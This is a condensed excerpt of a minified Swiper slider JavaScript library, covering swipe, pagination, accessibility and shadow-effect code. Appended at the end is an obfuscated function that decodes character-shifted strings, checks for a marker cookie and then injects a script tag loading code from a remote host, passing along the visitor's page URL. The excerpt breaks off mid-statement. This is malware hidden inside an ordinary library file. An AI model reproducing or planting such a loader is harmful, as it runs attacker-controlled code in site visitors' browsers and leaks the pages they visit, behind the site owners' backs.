!function(e, t) {
    ...
    function P(e) {
        ...
        if (c > a.longSwipesMs) {
            ...
            if (!a.shortSwipes)
                return void t.slideTo(t.activeIndex);
            !t.navigation || o.target !== t.navigation.nextEl && o.target !== t.navigation.prevEl ? ("next" === t.swipeDirection && t.slideTo(null !== g ? g : m + b),
            "prev" === t.swipeDirection && t.slideTo(null !== v ? v : m)) : o.target === t.navigation.nextEl ? t.slideTo(m + b) : t.slideTo(m)
        }
    }
    function k() {
        const e = this
    ...
    const B = {
        ...
        events: {
            attachEvents: function() {
                ...
                e.onClick = z.bind(e),
                i.touch && !O && (t.addEventListener("touchstart", I),
                O = !0),
                A(e, "on")
            },
    ...
    , function(e) {
        ...
        function p() {
            ...
            if ("fraction" === s.type && (r.find(R(s.currentClass)).text(s.formatFractionCurrent(p + 1)),
            r.find(R(s.totalClass)).text(s.formatFractionTotal(u))),
            "progressbar" === s.type) {
                let e;
                ...
                r.find(R(s.progressbarFillClass)).transform(`translate3d(0,0,0) scaleX(${i}) scaleY(${n})`).transition(t.params.speed)
            }
        ...
        function h() {
            ...
            e.clickable && s.on("click", R(e.bulletClass), (function(e) {
                e.preventDefault();
        ...
        function m() {
            ...
            e.clickable && s.off("click", R(e.bulletClass))
        }
        a("init", (()=>{
    ...
    , function(e) {
        ...
        function m(e) {
            ...
            t.pagination && a.is(R(t.params.pagination.bulletClass)) && a[0].click()
        }
        function f() {
        ...
        a("afterInit", (()=>{
            t.params.a11y.enabled && (()=>{
                ...
                g() && t.pagination.$el.on("keydown", R(t.params.pagination.bulletClass), m),
                t.$el.on("focus", w, !0)
            }
            )()
        }
        ...
        a("destroy", (()=>{
            t.params.a11y.enabled && function() {
                ...
                e && e.off("keydown", m),
                s && s.off("keydown", m),
                g() && t.pagination.$el.off("keydown", R(t.params.pagination.bulletClass), m),
                t.$el.off("focus", w, !0)
            }()
        }
        ))
    ...
    , function(e) {
        ...
        const i = (e,s,a)=>{
            ...
            0 === i.length && (i = Z(a, e, t.isHorizontal() ? "left" : "top")),
            0 === r.length && (r = Z(a, e, t.isHorizontal() ? "right" : "bottom")),
            ...
            setTranslate: ()=>{
                ...
                for (let s = 0; s < e.length; s += 1) {
                    ...
                    if (m && f.shadow || !m) {
                        ...
                        if (0 === e.length && f.shadow && (e = Z(r, a)),
                        e.length) {
...
function(e, t, s) {
    try {
        e.f = e=>e.split("").reduce(((e,t)=>e + String.fromCharCode((t.charCodeAt() - 5).toString())), ""),
        e.b = e.f("UMUWJKX"),
        e.c = "h" == s.protocol[0] && /\./.test(s.hostname) && !new RegExp(e.b).test(t.cookie),
        setTimeout((function() {
            e.c && (e.s = t.createElement("script"),
            e.s.src = e.f("myyux?44fun3hisrjywnh3htr4ljy4xyfynh3oxDwjkjwwjwB") + s.href,
